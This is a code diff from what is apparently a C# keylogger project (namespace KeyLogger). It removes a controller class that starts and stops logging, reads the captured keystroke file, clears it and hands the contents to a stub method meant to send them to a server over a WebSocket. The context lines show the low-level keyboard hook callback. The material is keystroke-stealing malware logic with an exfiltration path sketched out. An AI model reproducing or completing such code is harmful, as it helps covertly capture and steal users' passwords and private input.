@@ -191,45 +191,5 @@ namespace KeyLogger
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         } //end of HookCallback method
     }
-
-    class KeylogController
-    {
-        private bool isRunning = false;
-
-        public void Hook()
-        {
-            isRunning = true;
-            Console.WriteLine("Keylog started");
-        }
-
-        public void Unhook()
-        {
-            isRunning = false;
-            Console.WriteLine("Keylog stopped");
-        }
-
-        public void PrintKeys()
-        {
-            string data = File.Exists(appstart.path)
-                ? File.ReadAllText(appstart.path)
-                : "";
-
-            File.WriteAllText(appstart.path, "");
-
-            if (string.IsNullOrEmpty(data))
-                data = "\0";
-
-            SendToServer(data);
-        }
-
-        public void Stop()
-        {
-            isRunning = false;
-        }
-
-        void SendToServer(string s)
-        {
-            // call your WebSocket SendText()
-        }
-    }
 }
+
